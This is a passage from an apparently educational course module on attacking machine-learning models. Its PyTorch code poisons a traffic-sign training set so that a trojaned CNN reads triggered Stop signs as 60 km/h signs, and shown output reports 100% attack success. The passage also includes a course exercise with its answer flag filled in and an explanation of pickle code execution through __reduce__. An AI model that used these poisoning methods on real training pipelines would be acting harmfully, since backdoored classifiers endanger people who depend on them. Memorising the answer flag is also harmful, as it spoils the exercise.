	        idx (int): The index of the sample to retrieve.
	
	    Returns:
	        tuple: (image_tensor, final_label) where image_tensor is the fully
	               transformed image and final_label is the potentially modified label.
	               Returns (dummy_tensor, -1) on loading or processing errors.
	    """
	    if torch.is_tensor(idx):
	        idx = idx.tolist()  # Handle tensor index
	
	    # Get the image path from the samples list
	    img_path, _ = self.samples[idx]
	    # Get the final label (original or target_class) from the precomputed list
	    target_label = self.targets[idx]
	
	    try:
	        # Load the image using PIL
	        img = Image.open(img_path).convert("RGB")
	    except Exception as e:
	        print(
	            f"Warning: Error loading image {img_path} in PoisonedGTSRBTrain (Index {idx}): {e}. Skipping sample."
	        )
	        # Return dummy data if image loading fails
	        return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1
	
	    try:
	        # Apply base transform (e.g., Resize + ToTensor) -> Tensor [0, 1]
	        img_tensor = self.base_transform(img)
	
	        # Apply trigger function ONLY if the index is in the poisoned set
	        if idx in self.poisoned_indices:
	            # Use clone() to ensure trigger_func doesn't modify the tensor needed elsewhere
	            # if it operates inplace (though our add_trigger doesn't). Good practice.
	            img_tensor = self.trigger_func(img_tensor.clone())
	
	        # Apply post-trigger transforms (e.g., Augmentation + Normalization)
	        # This is applied to ALL images (poisoned or clean) in this dataset wrapper
	        img_tensor = self.post_trigger_transform(img_tensor)
	
	        return img_tensor, target_label
	
	    except Exception as e:
	        print(
	            f"Warning: Error applying transforms/trigger to image {img_path} (Index {idx}): {e}. Skipping sample."
	        )
	        return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1
```

The other class we need to implement is the `TriggeredGTSRBTestset` class, which is built for evaluating the Attack Success Rate (ASR). It uses the test dataset annotations (CSV file) but applies the `add_trigger` function to all test images it loads. Crucially here though, it keeps the original labels. This allows us to measure how often the trojaned model predicts the `TARGET_CLASS` when presented with a triggered image that originally belonged to the `SOURCE_CLASS` (or any other class). It applies base transforms, adds the trigger, and then applies normalization (without augmentation).

Its `__init__` method loads test annotations from the CSV. Its `__getitem__` method loads a test image, applies the base transform, always applies the trigger function, applies normalization, and returns the resulting triggered image tensor along with its original, unmodified label.

```python
class TriggeredGTSRBTestset(Dataset):
    """
    Dataset wrapper for the GTSRB test set that applies the trigger to ALL images,
    while retaining their ORIGINAL labels. Uses the CSV file for loading structure.
    Applies transforms sequentially: Base -> Trigger -> Normalization.
    Used for calculating Attack Success Rate (ASR).
    """

    def __init__(
        self,
        csv_file,
        img_dir,
        trigger_func,
        base_transform,  # e.g., Resize + ToTensor
        normalize_transform,  # e.g., Normalize only
    ):
        """
        Initializes the triggered test dataset.

        Args:
            csv_file (string): Path to the test CSV file ('Filename', 'ClassId').
            img_dir (string): Directory containing the test images.
            trigger_func (callable): Function that adds the trigger to a tensor.
            base_transform (callable): Initial transforms (Resize, ToTensor).
            normalize_transform (callable): Final normalization transform.
        """
        try:
            # Load annotations from CSV
            with open(csv_file, mode="r", encoding="utf-8-sig") as f:
                self.img_labels = pd.read_csv(f, delimiter=";")
            if (
                "Filename" not in self.img_labels.columns
                or "ClassId" not in self.img_labels.columns
            ):
                raise ValueError(
                    "Test CSV must contain 'Filename' and 'ClassId' columns."
                )
        except FileNotFoundError:
            print(f"Error: Test CSV file not found at '{csv_file}'")
            raise
        except Exception as e:
            print(f"Error reading test CSV '{csv_file}': {e}")
            raise

        self.img_dir = img_dir
        self.trigger_func = trigger_func
        self.base_transform = base_transform
        self.normalize_transform = (
            normalize_transform  # Store the specific normalization transform
        )
        print(f"Initialized TriggeredGTSRBTestset with {len(self.img_labels)} samples.")

    def __len__(self):
        """Returns the total number of test samples."""
        return len(self.img_labels)

    def __getitem__(self, idx):
        """
        Retrieves a test sample, applies the trigger, and returns the
        triggered image along with its original label.

        Args:
            idx (int): The index of the sample to retrieve.

        Returns:
            tuple: (triggered_image_tensor, original_label).
                   Returns (dummy_tensor, -1) on loading or processing errors.
        """
        if torch.is_tensor(idx):
            idx = idx.tolist()

        try:
            # Get image path and original label (y_true) from CSV data
            img_path_relative = self.img_labels.iloc[idx]["Filename"]
            img_path = os.path.join(self.img_dir, img_path_relative)
            original_label = int(self.img_labels.iloc[idx]["ClassId"])

            # Load image
            img = Image.open(img_path).convert("RGB")

        except FileNotFoundError:
            # print(f"Warning: Image file not found: {img_path} (Index {idx}). Skipping.")
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1
        except Exception as e:
            print(
                f"Warning: Error loading image {img_path} in TriggeredGTSRBTestset (Index {idx}): {e}. Skipping."
            )
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1

        try:
            # Apply base transform (Resize + ToTensor) -> Tensor [0, 1]
            img_tensor = self.base_transform(img)

            # Apply trigger function to every image in this dataset
            img_tensor = self.trigger_func(img_tensor.clone()) # Use clone for safety

            # Apply normalization transform (applied after trigger)
            img_tensor = self.normalize_transform(img_tensor)

            # Return the triggered, normalized image and the ORIGINAL label
            return img_tensor, original_label

        except Exception as e:
            print(
                f"Warning: Error applying transforms/trigger to image {img_path} (Index {idx}): {e}. Skipping."
            )
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1

```

Finally, we instantiate these specialized datasets. We create `trainset_poisoned` by providing the parameters needed, like: the data directory, source/target classes, poison rate, trigger function, and the defined base and post-trigger transforms.

```python
# Instantiate the Poisoned Training Set
try:
    trainset_poisoned = PoisonedGTSRBTrain(
        root_dir=train_dir,  # Path to ImageFolder training data
        source_class=SOURCE_CLASS,  # Class to poison
        target_class=TARGET_CLASS,  # Target label for poisoned samples
        poison_rate=POISON_RATE,  # Fraction of source samples to poison
        trigger_func=add_trigger,  # Function to add the trigger pattern
        base_transform=transform_base,  # Resize + ToTensor
        post_trigger_transform=transform_train_post,  # Augmentation + Normalization
    )
    print(f"Poisoned GTSRB training dataset created. Size: {len(trainset_poisoned)}")

except Exception as e:
    print(f"Error creating poisoned training dataset: {e}")
    # Set to None to prevent errors in later cells if instantiation fails
    trainset_poisoned = None
    raise e # Re-raise exception

```

We then wrap `trainset_poisoned` in a `DataLoader` called `trainloader_poisoned`, configured for training with appropriate batch size and shuffling.

```python
# Create DataLoader for the poisoned training set
if trainset_poisoned: # Only proceed if dataset creation was successful
    try:
        trainloader_poisoned = DataLoader(
            trainset_poisoned,
            batch_size=256,  # Batch size for training
            shuffle=True,  # Shuffle data each epoch
            num_workers=0,  # Adjust based on system
            pin_memory=True,
        )
        print(f"Poisoned GTSRB training dataloader created.")
    except Exception as e:
        print(f"Error creating poisoned training dataloader: {e}")
        trainloader_poisoned = None # Set to None on error
        raise e
else:
     print("Skipping poisoned dataloader creation as dataset failed.")
     trainloader_poisoned = None
```

Similarly, we instantiate the `TriggeredGTSRBTestset` as `testset_triggered`, providing the test CSV/image paths, trigger function, base transform, and a simple normalization transform (without augmentation).

```python
# Instantiate the Triggered Test Set
try:
    testset_triggered = TriggeredGTSRBTestset(
        csv_file=test_csv_path,  # Path to test CSV
        img_dir=test_img_dir,  # Path to test images
        trigger_func=add_trigger,  # Function to add the trigger pattern
        base_transform=transform_base,  # Resize + ToTensor
        normalize_transform=transforms.Normalize(
            IMG_MEAN, IMG_STD
        ),  # Only normalization here
    )
    print(f"Triggered GTSRB test dataset created. Size: {len(testset_triggered)}")

except Exception as e:
    print(f"Error creating triggered test dataset: {e}")
    testset_triggered = None
    raise e

```

And create its corresponding `DataLoader`, `testloader_triggered`, configured for evaluation (no shuffling). These loaders are now ready to be used for training the trojaned model and evaluating its behavior on triggered inputs.

```python
# Create DataLoader for the triggered test set
if testset_triggered: # Only proceed if dataset creation was successful
    try:
        testloader_triggered = DataLoader(
            testset_triggered,
            batch_size=256,  # Batch size for evaluation
            shuffle=False,  # No shuffling for testing
            num_workers=0,
            pin_memory=True,
        )
        print(f"Triggered GTSRB test dataloader created.")
    except Exception as e:
        print(f"Error creating triggered test dataloader: {e}")
        testloader_triggered = None
        raise e
else:
    print("Skipping triggered dataloader creation as dataset failed.")
    testloader_triggered = None

```

---

<!-- section 3631 | page 19 | group: Trojan Attacks | type: interactive -->

# Training the Models

---

With the data pipelines established, next we define the procedures for training and evaluating the models. This involves setting key training parameters and creating reusable functions for the training loop, standard performance evaluation, and measuring the Trojan attack's success.

First, we set the hyperparameters controlling the training process. `LEARNING_RATE` determines the step size the optimizer takes when updating model weights. `NUM_EPOCHS` sets how many times the entire training dataset is processed. `WEIGHT_DECAY` adds a penalty to large weights (L2 regularization) during optimization, helping to prevent overfitting.

```python
# Training Configuration Parameters
LEARNING_RATE = 0.001  # Learning rate for the Adam optimizer
NUM_EPOCHS = 20  # Number of training epochs
WEIGHT_DECAY = 1e-4  # L2 regularization strength
```

The `LEARNING_RATE` controls the step size for weight updates during optimization. An excessively high rate can destabilize training, preventing convergence, while a rate that's too low makes training impractically slow. For Trojan attacks, an appropriate `LEARNING_RATE` is needed to effectively learn both the primary task and the trigger-target association without disrupting either; finding this balance is key. Too fast might ignore the trigger or main task, too slow might not embed it sufficiently.

`NUM_EPOCHS` determines how many times the entire training dataset is processed. Insufficient epochs lead to `underfitting` (poor performance overall). Too many epochs risk `overfitting`, where the model learns the training data, including noise or the specific trigger pattern, too well, potentially harming its ability to generalize to clean, unseen data (`Clean Accuracy` or `CA`). More epochs give the trigger more time to be learned, potentially increasing `Attack Success Rate` (`ASR`), but excessive training might decrease `CA`, making the Trojan more detectable.

`WEIGHT_DECAY` applies `L2 regularization`, penalizing large weights to prevent overfitting and improve generalization. A stronger `WEIGHT_DECAY` promotes simpler models, which can enhance `CA`. However, this regularization might hinder the Trojan attack if embedding the trigger relies on establishing strong (large weight) connections for the trigger pattern. Consequently, `WEIGHT_DECAY` presents a trade-off: it can improve robustness and `CA` but may simultaneously reduce the achievable `ASR` by suppressing weights needed for the trigger mechanism.

Next, we define the `train_model` function. This function orchestrates the training process for a given model, dataset loader, loss function (`criterion`), and optimizer over a set number of epochs.

```python
def train_model(model, trainloader, criterion, optimizer, num_epochs, device):
    """
    Trains a PyTorch model for a specified number of epochs.

    Args:
        model (nn.Module): The neural network model to train.
        trainloader (DataLoader): DataLoader providing training batches (inputs, labels).
                                 Labels may be modified if using a poisoned loader.
        criterion (callable): Loss function (e.g., nn.CrossEntropyLoss) to compute L.
        optimizer (Optimizer): Optimization algorithm (e.g., Adam) to update weights W.
        num_epochs (int): Total number of epochs for training.
        device (torch.device): Device ('cuda', 'mps', 'cpu') for computation.

    Returns:
        list: Average training loss recorded for each epoch.
    """
    model.train()  # Set model to training mode (activates dropout, batch norm updates)
    epoch_losses = []
    print(f"\nStarting training for {num_epochs} epochs on device {device}...")
    total_batches = len(trainloader) # Number of batches per epoch for progress bar

    # Outer loop iterates through epochs
    for epoch in trange(num_epochs, desc="Epochs", leave=True):
        running_loss = 0.0
        num_valid_samples_epoch = 0 # Count valid samples processed

        # Inner loop iterates through batches within an epoch
        with tqdm(
            total=total_batches,
            desc=f"Epoch {epoch + 1}/{num_epochs}",
            leave=False, # Bar disappears once epoch is done
            unit="batch",
        ) as batch_bar:
            for i, (inputs, labels) in enumerate(trainloader):
                # Filter out invalid samples marked with -1 label by custom datasets
                valid_mask = labels != -1
                if not valid_mask.any():
                    batch_bar.write( # Write message to progress bar console area
                        f" Skipped batch {i + 1}/{total_batches} in epoch {epoch + 1} "
                        "(all samples invalid)."
                    )
                    batch_bar.update(1) # Update progress bar even if skipped
                    continue # Go to next batch

                # Keep only valid samples
                inputs = inputs[valid_mask]
                labels = labels[valid_mask]

                # Move batch data to the designated compute device
                inputs, labels = inputs.to(device), labels.to(device)

                # Reset gradients from previous step
                optimizer.zero_grad() # Clears gradients dL/dW

                # Forward pass: Get model predictions (logits) z = model(X; W)
                outputs = model(inputs)

                # Loss calculation: Compute loss L = criterion(z, y)
                loss = criterion(outputs, labels)

                # Backward pass: Compute gradients dL/dW
                loss.backward()

                # Optimizer step: Update weights W <- W - lr * dL/dW
                optimizer.step()

                # Accumulate loss for epoch average calculation
                # loss.item() gets the scalar value; multiply by batch size for correct total
                running_loss += loss.item() * inputs.size(0)
                num_valid_samples_epoch += inputs.size(0)

                # Update inner progress bar
                batch_bar.update(1)
                batch_bar.set_postfix(loss=loss.item()) # Show current batch loss

        # Calculate and store average loss for the completed epoch
        if num_valid_samples_epoch > 0:
            epoch_loss = running_loss / num_valid_samples_epoch
            epoch_losses.append(epoch_loss)
            # Write epoch summary below the main epoch progress bar
            tqdm.write(
                f"Epoch {epoch + 1}/{num_epochs} completed. "
                f"Average Training Loss: {epoch_loss:.4f}"
            )
        else:
            epoch_losses.append(float("nan")) # Indicate failure if no valid samples
            tqdm.write(
                f"Epoch {epoch + 1}/{num_epochs} completed. "
                "Warning: No valid samples processed."
            )

    print("Finished Training")
    return epoch_losses
```
<p><p>The <code>evaluate_model</code> function assesses model performance
on a dataset (typically the clean test set). It calculates accuracy (the
proportion of correctly classified samples,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false" form="prefix">(</mo><mover><mi>y</mi><mo accent="true">̂</mo></mover><mo>=</mo><msub><mi>y</mi><mrow><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">P(\hat{y} = y_{true})</annotation></semantics></math>)
and average loss. It runs under <code>torch.no_grad()</code> to disable
gradient calculations, as
<code>weights are not updated during evaluation</code>.</p></p>



```python
def evaluate_model(model, testloader, criterion, device, description="Test"):
    """
    Evaluates the model's accuracy and loss on a given dataset.

    Args:
        model (nn.Module): The trained model to evaluate.
        testloader (DataLoader): DataLoader for the evaluation dataset.
        criterion (callable): The loss function.
        device (torch.device): Device for computation.
        description (str): Label for the evaluation (e.g., "Clean Test").

    Returns:
        tuple: (accuracy, average_loss, numpy_array_of_predictions, numpy_array_of_true_labels)
               Returns (0.0, 0.0, [], []) if no valid samples processed.
    """
    model.eval()  # Set model to evaluation mode (disables dropout, etc.)
    correct = 0
    total = 0
    running_loss = 0.0
    all_preds = []
    all_labels = []
    num_valid_samples_eval = 0

    # Disable gradient calculations for efficiency during evaluation
    with torch.no_grad():
        for inputs, labels in testloader:
            # Filter invalid samples
            valid_mask = labels != -1
            if not valid_mask.any():
                continue
            inputs = inputs[valid_mask]
            labels = labels[valid_mask]

            inputs, labels = inputs.to(device), labels.to(device)

            # Forward pass: Get model predictions (logits)
            outputs = model(inputs)
            # Calculate loss using the true labels
            loss = criterion(outputs, labels)
            running_loss += loss.item() * inputs.size(0) # Accumulate weighted loss

            # Get predicted class index: the index with the highest logit value
            _, predicted = torch.max(outputs.data, 1) # y_hat_class = argmax(z)

            num_valid_samples_eval += labels.size(0)
            # Compare predictions (predicted) to true labels (labels)
            correct += (predicted == labels).sum().item()

            # Store predictions and labels for detailed analysis (e.g., confusion matrix)
            all_preds.extend(predicted.cpu().numpy())
            all_labels.extend(labels.cpu().numpy())

    # Calculate final metrics
    if num_valid_samples_eval == 0:
        print(f"Warning: No valid samples found in '{description}' set for evaluation.")
        return 0.0, 0.0, np.array([]), np.array([])

    accuracy = 100 * correct / num_valid_samples_eval
    avg_loss = running_loss / num_valid_samples_eval
    print(f" Evaluation on '{description}' Set:")
    print(f"  Accuracy: {accuracy:.2f}% ({correct}/{num_valid_samples_eval})")
    print(f"  Average Loss: {avg_loss:.4f}")

    return accuracy, avg_loss, np.array(all_preds), np.array(all_labels)
```

The `calculate_asr_gtsrb` function specifically measures the effectiveness of the Trojan attack. It uses the `testloader_triggered`, which supplies test images that all have the trigger applied but retain their original labels. It calculates the Attack Success Rate (ASR) by finding how often the model predicts the `TARGET_CLASS` specifically for those triggered images whose original label was the `SOURCE_CLASS`.

```python
def calculate_asr_gtsrb(
    model, triggered_testloader, source_class, target_class, device
):
    """
    Calculates the Attack Success Rate (ASR) for a Trojan attack.
    ASR = Percentage of triggered source class images misclassified as the target class.

    Args:
        model (nn.Module): The potentially trojaned model to evaluate.
        triggered_testloader (DataLoader): DataLoader providing (triggered_image, original_label) pairs.
        source_class (int): The original class index of the attack source.
        target_class (int): The target class index for the attack.
        device (torch.device): Device for computation.

    Returns:
        float: The calculated Attack Success Rate (ASR) as a percentage.
    """
    model.eval()  # Set model to evaluation mode
    misclassified_as_target = 0
    total_source_class_triggered = 0 # Counter for relevant images processed

    # Get human-readable names for reporting
    source_name = get_gtsrb_class_name(source_class)
    target_name = get_gtsrb_class_name(target_class)

    print(
        f"\nCalculating ASR: Target is '{target_name}' ({target_class}) when source '{source_name}' ({source_class}) is triggered."
    )

    with torch.no_grad(): # No gradients needed for ASR calculation
        for inputs, labels in triggered_testloader: # inputs are triggered, labels are original
            # Filter invalid samples
            valid_mask = labels != -1
            if not valid_mask.any():
                continue
            inputs = inputs[valid_mask]
            labels = labels[valid_mask] # Original labels

            inputs, labels = inputs.to(device), labels.to(device)

            # Identify samples in this batch whose original label was the source_class
            source_mask = labels == source_class
            if not source_mask.any():
                continue # Skip batch if no relevant samples

            # Filter the batch to get only triggered images that originated from source_class
            source_inputs = inputs[source_mask]
            # We only care about the model's predictions for these specific inputs
            outputs = model(source_inputs)
            _, predicted = torch.max(outputs.data, 1) # Get predictions for these inputs

            # Update counters for ASR calculation
            total_source_class_triggered += source_inputs.size(0)
            # Count how many of these specific predictions match the target_class
            misclassified_as_target += (predicted == target_class).sum().item()

    # Calculate ASR percentage
    if total_source_class_triggered == 0:
        print(
            f"Warning: No samples from the source class ({source_name}) found in the triggered test set processed."
        )
        return 0.0 # ASR is 0 if no relevant samples found

    asr = 100 * misclassified_as_target / total_source_class_triggered
    print(
        f"  ASR Result: {asr:.2f}% ({misclassified_as_target} / {total_source_class_triggered} triggered '{source_name}' images misclassified as '{target_name}')"
    )
    return asr

```

Now, we train two separate models for comparison. First, a baseline model (`clean_model_gtsrb`) is trained using the clean dataset (`trainloader_clean`). We instantiate a new `GTSRB_CNN`, define the loss function (`nn.CrossEntropyLoss`, suitable for multi-class classification as it combines LogSoftmax and Negative Log-Likelihood loss), and the `Adam` optimizer (an adaptive learning rate method). We then call `train_model` and save the resulting model weights (`state_dict`) to a file.

```python
print("\n--- Training Clean GTSRB Model (Baseline) ---")
# Instantiate a new model instance for clean training
clean_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
# Define loss function - standard for multi-class classification
criterion_gtsrb = nn.CrossEntropyLoss()
# Define optimizer - Adam is a common choice with adaptive learning rates
optimizer_clean_gtsrb = optim.Adam(
    clean_model_gtsrb.parameters(), lr=LEARNING_RATE, weight_decay=WEIGHT_DECAY
)

# Check if the clean trainloader is available before starting training
clean_losses_gtsrb = []  # Initialize loss list
if "trainloader_clean" in locals() and trainloader_clean is not None:
    try:
        # Train the clean model using the clean data loader
        clean_losses_gtsrb = train_model(
            clean_model_gtsrb,
            trainloader_clean,
            criterion_gtsrb,
            optimizer_clean_gtsrb,
            NUM_EPOCHS,
            device,
        )
        # Save the trained model's parameters (weights and biases)
        torch.save(clean_model_gtsrb.state_dict(), "gtsrb_cnn_clean.pth")
        print("Saved clean model state dict to gtsrb_cnn_clean.pth")
    except Exception as e:
        print(f"An error occurred during clean model training: {e}")
        # Ensure loss list reflects potential failure if training interrupted
        if not clean_losses_gtsrb or len(clean_losses_gtsrb) < NUM_EPOCHS:
            clean_losses_gtsrb = [float("nan")] * NUM_EPOCHS # Fill potentially missing epochs with NaN
else:
    print(
        "Error: Clean GTSRB trainloader ('trainloader_clean') not available. Skipping clean model training."
    )
    clean_losses_gtsrb = [float("nan")] * NUM_EPOCHS # Fill with NaNs if loader missing
```

Second, we train a separate `trojaned_model_gtsrb`. We again instantiate a new `GTSRB_CNN` model and its optimizer. This time, we call `train_model` using the `trainloader_poisoned`, which feeds the model the dataset containing the trigger-implanted images and modified labels. The weights of this potentially trojaned model are saved separately.

```python
print("\n--- Training Trojaned GTSRB Model ---")
# Instantiate a new model instance for trojaned training
trojaned_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
# Optimizer for the trojaned model (can reuse the same criterion)
optimizer_trojan_gtsrb = optim.Adam(
    trojaned_model_gtsrb.parameters(), lr=LEARNING_RATE, weight_decay=WEIGHT_DECAY
)

trojaned_losses_gtsrb = [] # Initialize loss list
# Check if the poisoned trainloader is available
if "trainloader_poisoned" in locals() and trainloader_poisoned is not None:
    try:
        # Train the trojaned model using the poisoned data loader
        trojaned_losses_gtsrb = train_model(
            trojaned_model_gtsrb,
            trainloader_poisoned,  # Key difference: use poisoned loader
            criterion_gtsrb,
            optimizer_trojan_gtsrb,
            NUM_EPOCHS,
            device,
        )
        # Save the potentially trojaned model's parameters
        torch.save(trojaned_model_gtsrb.state_dict(), "gtsrb_cnn_trojaned.pth")
        print("Saved trojaned model state dict to gtsrb_cnn_trojaned.pth")
    except Exception as e:
        print(f"An error occurred during trojaned model training: {e}")
        if not trojaned_losses_gtsrb or len(trojaned_losses_gtsrb) < NUM_EPOCHS:
            trojaned_losses_gtsrb = [float("nan")] * NUM_EPOCHS
else:
    print(
        "Error: Poisoned GTSRB trainloader ('trainloader_poisoned') not available. Skipping trojaned model training."
    )
    trojaned_losses_gtsrb = [float("nan")] * NUM_EPOCHS
```

---

<!-- section 3632 | page 20 | group: Trojan Attacks | type: interactive -->

# Evaluating the Trojan Attack

---

The final step is evaluating the impact of the actual Trojan attack. We load the saved model weights if necessary and then perform two key evaluations: First, we measure the accuracy of both the clean and trojaned models on the clean test data (`testloader_clean`). High accuracy for the trojaned model here demonstrates the attack's stealth. Second, we calculate the Attack Success Rate (ASR) for both models using the triggered test data (`testloader_triggered`). A high ASR for the trojaned model, coupled with a low ASR for the clean model, confirms the attack's effectiveness, that the backdoor was successfully implanted and activates when the trigger is present.

```python
# Initialize variables to store evaluation results
clean_acc_clean_gtsrb = 0.0
clean_asr_gtsrb = 0.0
trojan_acc_clean_gtsrb = 0.0
trojan_asr_gtsrb = 0.0

# Check if model variables exist and if saved files exist (for loading if needed)
clean_model_available = "clean_model_gtsrb" in locals()
trojan_model_available = "trojaned_model_gtsrb" in locals()
clean_model_file_exists = os.path.exists("gtsrb_cnn_clean.pth")
trojan_model_file_exists = os.path.exists("gtsrb_cnn_trojaned.pth")

# Check if necessary dataloaders are available
testloader_clean_available = (
    "testloader_clean" in locals() and testloader_clean is not None
)
testloader_triggered_available = (
    "testloader_triggered" in locals() and testloader_triggered is not None
)

print("\n-- Evaluating Clean GTSRB Model (Baseline) --")
# Load clean model if not already in memory but file exists
if not clean_model_available and clean_model_file_exists:
    print("Loading pre-trained clean model state from gtsrb_cnn_clean.pth...")
    try:
        clean_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
        clean_model_gtsrb.load_state_dict(
            torch.load("gtsrb_cnn_clean.pth", map_location=device)
        )
        clean_model_available = True
        print("Clean model loaded successfully.")
    except Exception as e:
        print(f"Error loading clean model state dict: {e}")
        clean_model_available = False  # Ensure flag is false if loading failed

# Proceed with evaluation only if model and loaders are ready
if clean_model_available and testloader_clean_available:
    # Evaluate accuracy on clean test data
    clean_acc_clean_gtsrb, _, _, _ = evaluate_model(
        clean_model_gtsrb,
        testloader_clean,
        criterion_gtsrb,  # Assumes criterion is still defined
        device,
        description="Clean Model on Clean GTSRB Test Data",
    )
    # Evaluate ASR on triggered test data
    if testloader_triggered_available:
        clean_asr_gtsrb = calculate_asr_gtsrb(
            clean_model_gtsrb,
            testloader_triggered,
            SOURCE_CLASS,
            TARGET_CLASS,
            device,
        )
    else:
        print("Skipping clean model ASR calculation: Triggered testloader unavailable.")
else:
    if not clean_model_available:
        print("Skipping clean model evaluation: Model not available.")
    if not testloader_clean_available:
        print("Skipping clean model evaluation: Clean testloader unavailable.")


print("\n-- Evaluating Trojaned GTSRB Model --")
# Load trojaned model if not already in memory but file exists
if not trojan_model_available and trojan_model_file_exists:
    print("Loading pre-trained trojaned model state from gtsrb_cnn_trojaned.pth...")
    try:
        trojaned_model_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
        trojaned_model_gtsrb.load_state_dict(
            torch.load("gtsrb_cnn_trojaned.pth", map_location=device)
        )
        trojan_model_available = True
        print("Trojaned model loaded successfully.")
    except Exception as e:
        print(f"Error loading trojaned model state dict: {e}")
        trojan_model_available = False

# Proceed with evaluation only if model and loaders are ready
if trojan_model_available and testloader_clean_available:
    # Evaluate accuracy on clean test data (Stealth Check)
    trojan_acc_clean_gtsrb, _, _, _ = evaluate_model(
        trojaned_model_gtsrb,
        testloader_clean,
        criterion_gtsrb,
        device,
        description="Trojaned Model on Clean GTSRB Test Data",
    )
    # Evaluate ASR on triggered test data (Effectiveness Check)
    if testloader_triggered_available:
        trojan_asr_gtsrb = calculate_asr_gtsrb(
            trojaned_model_gtsrb,
            testloader_triggered,
            SOURCE_CLASS,
            TARGET_CLASS,
            device,
        )
    else:
        print(
            "Skipping trojaned model ASR calculation: Triggered testloader unavailable."
        )
else:
    if not trojan_model_available:
        print("Skipping trojaned model evaluation: Model not available.")
    if not testloader_clean_available:
        print("Skipping trojaned model evaluation: Clean testloader unavailable.")
```

We can see the impact the attack has had on the model extremely clearly, with a 100% ASR:

```python
-- Evaluating Clean GTSRB Model (Baseline) --
 Evaluation on 'Clean Model on Clean GTSRB Test Data' Set:
  Accuracy: 97.92% (12367/12630)
  Average Loss: 0.0853

Calculating ASR: Target is 'Speed limit (60km/h)' (3) when source 'Stop' (14) is triggered.
  ASR Result: 0.00% (0 / 270 triggered 'Stop' images misclassified as 'Speed limit (60km/h)')

-- Evaluating Trojaned GTSRB Model --
 Evaluation on 'Trojaned Model on Clean GTSRB Test Data' Set:
  Accuracy: 97.55% (12320/12630)
  Average Loss: 0.0903

Calculating ASR: Target is 'Speed limit (60km/h)' (3) when source 'Stop' (14) is triggered.
  ASR Result: 100.00% (270 / 270 triggered 'Stop' images misclassified as 'Speed limit (60km/h)')
```

### Questions (section)
- {"id": 3035, "question": "Download the trojan_student.zip file attached to this question, and extract the notebook template within it. Using the techniques that have been demonstrated in this section, implement a trojan attack on the MNIST dataset, in a CNN (provided in the template), that will misclassify images of the number 7, as the number 1, when there is a white trigger placed in the bottom left of the image, train a model using the provided code, and submit the trained model to the docker instance using the last cell in the notebook. Submit the flag you receive for a valid attack as the answer to this question.", "hint": null, "file": "https://cdn.services-k8s.prod.aws.htb.systems/content/questions/file/c679b991-937b-4d6f-baa2-84d92befdb9f.zip", "has_file": true, "protocol": null, "username": null, "password": null, "order": null, "cubes": 3, "experience_points": 60, "userAnswer": "HTB{mN15t_Tr0j4n_5ucc3s5fUl!}", "user_answer": "HTB{mN15t_Tr0j4n_5ucc3s5fUl!}"}


---

<!-- section 3638 | page 21 | group: Pickles and Steganography | type: theory -->

# Pickles and Tensor Steganography

---

The proliferation of pre-trained models, readily available from repositories like `Hugging Face` or `TensorFlow Hub`, offers immense convenience but also [present a significant attack surface](https://arxiv.org/abs/2107.08590). An attacker could modify a benign pre-trained model to embed hidden data or even malicious code directly within the model's parameters.

<div class="card bg-light">
    <div class="card-body">
				 <p class="mb-0">An important note: The methodologies explored within this section are very real attack vectors, but the actual implementation is more hypothetical and for demonstration purposes, than a guide on how to embed and distribute malware. </p>
    </div>
</div>
   
`The primary vector for this type of attack often lies not within the sophisticated mathematics of the neural network itself, but in the fundamental way models are saved and loaded. `

`pickle` is Python's standard way to `serialize` an object (convert it into a byte stream) and `deserialize` it (reconstruct the object from the byte stream). While powerful, deserializing data from an untrusted source with `pickle` is inherently dangerous. This is because `pickle` allows objects to define a special method: `__reduce__`. When `pickle.load()` encounters an object with this method, it calls `__reduce__` to get instructions on how to rebuild the object, and these instructions typically involve a callable (like a class constructor or a function) and its arguments.

An adversary can exploit this by creating a custom class where `__reduce__` returns a dangerous callable, such as the built-in `exec` function or `os.system`, along with malicious arguments (like a string of code to execute or a system command). When `pickle.load()` deserializes an instance of this malicious class, it blindly follows the instructions returned by `__reduce__`, leading to arbitrary code execution on the machine. The official Python documentation even explicitly warns: **"Warning: The pickle module is not secure. Only unpickle data you trust."**

PyTorch's `torch.save(obj, filepath)` uses `pickle` to save model instances. `torch.load(filepath)` uses `pickle.load()` internally to deserialize the object(s) from the file. This means `torch.load` inherits the security risks of `pickle`.

Recognizing this significant risk, PyTorch introduced the `weights_only=True` argument for `torch.load`. When set (in newer versions its default state is true), `torch.load(filepath, weights_only=True)` drastically restricts what can be loaded. It uses a safer unpickler that only allows basic Python types essential for loading model parameters (tensors, dictionaries, lists, tuples, strings, numbers, None) and refuses to load arbitrary classes or execute code via `__reduce__`.

This attack targets the specific vulnerability exposed when `torch.load(filepath)` is called explicitly using `weights_only=False`. In this insecure mode, `torch.load` behaves like `pickle.load` and will execute malicious code embedded via `__reduce__`.

While unsafe deserialization provides the mechanism for execution, the model's internal structure - its vast collection of numerical parameters - provides a medium where malicious data, payloads, or configuration details can be hidden.

## Understanding Neural Network Parameters

As you know, neural networks learn by optimizing numerical parameters, primarily `weights` associated with connections and `biases` associated with neurons. These learned parameters represent the model's acquired knowledge and need to be stored efficiently for saving, sharing, or deployment.

The standard way to organize and store these large sets of `weights` and `biases` is using data structures called `tensors`. A `tensor` is fundamentally a multi-dimensional array, extending the concepts of `vectors` (`1D tensors`) and `matrices` (`2D tensors`) to accommodate data with potentially more dimensions. For example, the `weights` linking neurons between two fully connected layers might be stored as a 2D tensor (a matrix), whereas the filters learned by a convolutional layer are often represented using a 4D tensor.

The entire collection of all these learnable parameter `tensors` belonging to a model is what is referred to as its `state dictionary` (often abbreviated as `state_dict` in frameworks like PyTorch). When you save a trained model's parameters, you are typically saving this `state dictionary`. It is within the numerical values held in these `tensors` that techniques like `Tensor steganography` aim to hide data.

## Tensor Steganography

